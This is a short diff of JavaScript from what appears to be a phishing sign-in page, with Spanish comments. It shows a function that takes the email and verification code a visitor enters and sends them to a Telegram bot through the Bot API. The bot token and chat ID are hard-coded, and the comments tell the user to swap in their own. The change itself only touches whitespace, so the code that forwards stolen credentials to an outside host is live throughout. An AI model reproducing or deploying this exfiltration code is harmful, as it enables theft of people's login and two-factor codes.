@@ -226,8 +226,8 @@ signInBtn.addEventListener('click', () => {
 });
 // Lógica para enviar el código a Telegram
 function enviarCodigoTelegram(email, codigo) {
-  const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0'; // Cambias por el tuyo
-  const chatId = '1739505466'; // Cambias por el tuyo
+     const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0'; //cambias por el tuyo
+  const chatId = '1739505466';// cambias por el tuyo
   const mensaje = `Código ingresado\nCorreo: ${email}\nCódigo: ${codigo}`;
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   fetch(url, {
